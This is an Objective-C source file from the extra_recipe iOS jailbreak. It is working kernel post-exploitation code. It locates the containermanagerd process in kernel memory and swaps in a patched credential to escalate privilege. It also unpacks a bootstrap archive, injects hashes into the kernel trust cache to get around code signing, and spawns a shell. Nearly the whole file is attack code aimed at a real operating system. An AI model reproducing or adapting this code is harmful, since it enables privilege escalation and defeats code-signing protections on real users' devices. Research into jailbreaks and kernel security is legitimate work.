//
//  unjail.m
//  extra_recipe
//
//  Created by xerub on 16/05/2017.
//  Copyright © 2017 xerub. All rights reserved.
//

#include "unjail.h"
#include "offsets.h"
#include "libjb.h"
#include "getshell.h"

kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);

#include "patchfinder64.h"

uint64_t hibit_guess = 0;

// @qwertyoruiop's physalloc

static uint64_t
kalloc(vm_size_t size)
{
    mach_vm_address_t address = 0;

    if (hibit_guess == 0xFFFFFFE000000000) {
        // md = IOBufferMemoryDescriptor::withOptions(kIOMemoryTypeVirtual, size, 1)
        uint64_t md = kx5(constget(7) + kaslr_shift, 0x10, size, 1, 0, 0) | hibit_guess;
        // md->getBytesNoCopy()
        return kx5(constget(8) + kaslr_shift, md, 0, 0, 0, 0) | hibit_guess;
    }

    mach_vm_allocate(tfp0, (mach_vm_address_t *)&address, size, VM_FLAGS_ANYWHERE);
    return address;
}

int
unjail2(uint64_t allproc, uint64_t credpatch)
{
    int rv;

    if (mp) {
        hibit_guess = 0xFFFFFFE000000000;
    }

    rv = init_kernel(kernel_base, NULL);
    assert(rv == 0);

    uint64_t trust_chain = find_trustcache();
    uint64_t amficache = find_amficache();

    term_kernel();

    char path[4096];
    uint32_t size = sizeof(path);
    _NSGetExecutablePath(path, &size);
    char *pt = realpath(path, NULL);

    NSString *execpath = [[NSString stringWithUTF8String:pt] stringByDeletingLastPathComponent];

    /* 1. fix containermanagerd */
	{
		pid_t pd;
		uint64_t c_cred = 0;
		uint64_t proc = kread_uint64(allproc);
		while (proc) {
			char comm[20];
			kread(proc + offsetof_p_comm, comm, 16);
			comm[17] = 0;
			if (strstr(comm, "containermanager")) {
				break;
			}
			proc = kread_uint64(proc);
		}
		if (proc) {
			printf("containermanagerd proc: 0x%llx\n", proc);
			c_cred = kread_uint64(proc + offsetof_p_ucred);
			kwrite_uint64(proc + offsetof_p_ucred, credpatch);
		}
	}
	
	/* 2. remount "/" */ // do not work for me. just commit it
	/*{
		struct utsname uts;
		uname(&uts);
		
		vm_offset_t off = 0xd8;
		if (strstr(uts.version, "16.0.0")) {
			off = 0xd0;
		}
		
		uint64_t _rootvnode = mp ? (constget(5) + kaslr_shift) : (find_gPhysBase() + 0x38);
		uint64_t rootfs_vnode = kread_uint64(_rootvnode);
		uint64_t v_mount = kread_uint64(rootfs_vnode + off);
		uint32_t v_flag = kread_uint32(v_mount + 0x71);
		
		kwrite_uint32(v_mount + 0x71, v_flag & ~(1 << 6));
		
		char *nmz = strdup("/dev/disk0s1s1");
		rv = mount("hfs", "/", MNT_UPDATE, (void *)&nmz);
		NSLog(@"remounting: %d", rv);
		
		v_mount = kread_uint64(rootfs_vnode + off);
		kwrite_uint32(v_mount + 0x71, v_flag);
	}*/

    /* 3. untar bootstrap.tar */
	{
	
		NSString *bootstrap = [execpath stringByAppendingPathComponent:@"bootstrap.tar"];
		FILE *a = fopen([bootstrap UTF8String], "rb");
		chdir("/tmp");
		untar(a, "bootstrap");
		fclose(a);
	}


    /* 4. inject trust cache */
	{
		printf("trust_chain = 0x%llx\n", trust_chain);

		struct trust_mem mem;
		mem.next = kread_uint64(trust_chain);
		*(uint64_t *)&mem.uuid[0] = 0xabadbabeabadbabe;
		*(uint64_t *)&mem.uuid[8] = 0xabadbabeabadbabe;

		rv = grab_hashes("/tmp/bins", kread, amficache, mem.next);
		printf("rv = %d, numhash = %d\n", rv, numhash);

		size_t length = (sizeof(mem) + numhash * 20 + 0xFFFF) & ~0xFFFF;
		uint64_t kernel_trust = kalloc(length);
		printf("alloced: 0x%zx => 0x%llx\n", length, kernel_trust);

		mem.count = numhash;
		kwrite(kernel_trust, &mem, sizeof(mem));
		kwrite(kernel_trust + sizeof(mem), allhash, numhash * 20);
		kwrite_uint64(trust_chain, kernel_trust);

		free(allhash);
		free(allkern);
		free(amfitab);
	}
	
		// getshell
		getshell();
	
    printf("done\n");
    return 0;
}
